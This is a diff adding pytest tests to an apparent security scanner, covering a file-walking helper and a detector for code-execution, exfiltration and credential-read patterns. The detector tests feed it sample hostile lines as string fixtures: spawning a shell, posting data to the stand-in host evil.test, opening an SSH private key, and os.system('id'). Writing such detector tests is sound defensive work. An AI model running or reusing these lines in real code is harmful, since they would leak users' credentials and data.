@@ -1082,3 +1082,109 @@ class TestAtomicWrite:
         # No final file and no stray temp left behind.
         assert not os.path.exists(p)
         assert list(tmp_path.glob("*.tmp.*")) == []
+
+
+class TestWalkAux:
+    """U0: walk_aux — the cap-free / __pycache__-reaching traversal the
+    oversize, bytecode, and archive scanners share (KTD1)."""
+
+    def _rels(self, repo):
+        return {rel for _fp, rel in core.walk_aux(str(repo))}
+
+    def test_yields_files_over_size_cap(self, tmp_path):
+        # A 12 MB file that walk_repo skips at the line-388 cap must be yielded.
+        big = tmp_path / "padded.bin"
+        big.write_bytes(b"A" * (12 * 1024 * 1024))
+        rels = self._rels(tmp_path)
+        assert "padded.bin" in rels
+
+    def test_walk_repo_still_skips_over_size_cap(self, tmp_path):
+        # Regression guard: the shared default is unchanged.
+        big = tmp_path / "padded.bin"
+        big.write_bytes(b"A" * (12 * 1024 * 1024))
+        rels = {rel for _fp, rel in core.walk_repo(str(tmp_path), skip_binary=False)}
+        assert "padded.bin" not in rels
+
+    def test_apply_size_cap_true_skips_over_cap(self, tmp_path):
+        big = tmp_path / "padded.bin"
+        big.write_bytes(b"A" * (12 * 1024 * 1024))
+        small = tmp_path / "small.txt"
+        small.write_text("hello")
+        rels = {rel for _fp, rel in core.walk_aux(str(tmp_path), apply_size_cap=True)}
+        assert "padded.bin" not in rels
+        assert "small.txt" in rels
+
+    def test_reaches_pycache_when_requested(self, tmp_path):
+        pyc_dir = tmp_path / "__pycache__"
+        pyc_dir.mkdir()
+        (pyc_dir / "mod.cpython-314.pyc").write_bytes(b"\x00\x01\x02\x03")
+        with_reach = {rel for _fp, rel in core.walk_aux(str(tmp_path), reach_pycache=True)}
+        without = {rel for _fp, rel in core.walk_aux(str(tmp_path), reach_pycache=False)}
+        assert any("mod.cpython-314.pyc" in r for r in with_reach)
+        assert not any("__pycache__" in r for r in without)
+
+    def test_yields_binary_extensions(self, tmp_path):
+        # walk_aux never applies the BINARY_EXTENSIONS skip (callers inspect bytes).
+        z = tmp_path / "bundle.zip"
+        z.write_bytes(b"PK\x03\x04rest")
+        rels = self._rels(tmp_path)
+        assert "bundle.zip" in rels
+
+    def test_refuses_symlinks(self, tmp_path):
+        target = tmp_path / "real.txt"
+        target.write_text("x")
+        link = tmp_path / "link.txt"
+        try:
+            os.symlink(target, link)
+        except (OSError, NotImplementedError):
+            pytest.skip("symlinks unsupported on this platform")
+        rels = self._rels(tmp_path)
+        assert "real.txt" in rels
+        assert "link.txt" not in rels
+
+    def test_honours_ignore_dirs(self, tmp_path):
+        (tmp_path / "node_modules").mkdir()
+        (tmp_path / "node_modules" / "junk.js").write_text("x")
+        (tmp_path / "keep.js").write_text("x")
+        rels = self._rels(tmp_path)
+        assert "keep.js" in rels
+        assert not any("node_modules" in r for r in rels)
+
+
+class TestScanTextTrifecta:
+    """U0: scan_text_trifecta — trifecta primitives over an in-memory blob."""
+
+    def test_matches_exec_primitive_individually(self):
+        findings = core.scan_text_trifecta("x = 1\nos.system('id')\n", "blob.txt")
+        cats = {f.category for f in findings}
+        assert "code-execution" in cats
+        # Individual emission: a single primitive surfaces (unlike detect_trifecta_raw).
+        assert len(findings) == 1
+
+    def test_all_three_primitives(self):
+        text = (
+            "subprocess.run(['sh'])\n"
+            "requests.post('http://evil.test', data=x)\n"
+            "open('/home/u/.ssh/id_rsa')\n"
+        )
+        findings = core.scan_text_trifecta(text, "blob.txt")
+        cats = {f.category for f in findings}
+        assert cats == {"code-execution", "exfiltration", "credential-read"}
+
+    def test_skips_comment_lines(self):
+        findings = core.scan_text_trifecta("# os.system('id')\n", "blob.txt")
+        assert findings == []
+
+    def test_benign_text_no_findings(self):
+        findings = core.scan_text_trifecta("def add(a, b):\n    return a + b\n", "blob.txt")
+        assert findings == []
+
+    def test_line_attribution(self):
+        findings = core.scan_text_trifecta("line1\nline2\nos.system('id')\n", "blob.txt")
+        assert findings[0].line == 3
+
+    def test_first_match_per_primitive_only(self):
+        text = "os.system('a')\nos.system('b')\n"
+        findings = core.scan_text_trifecta(text, "blob.txt")
+        assert len(findings) == 1
+        assert findings[0].line == 1
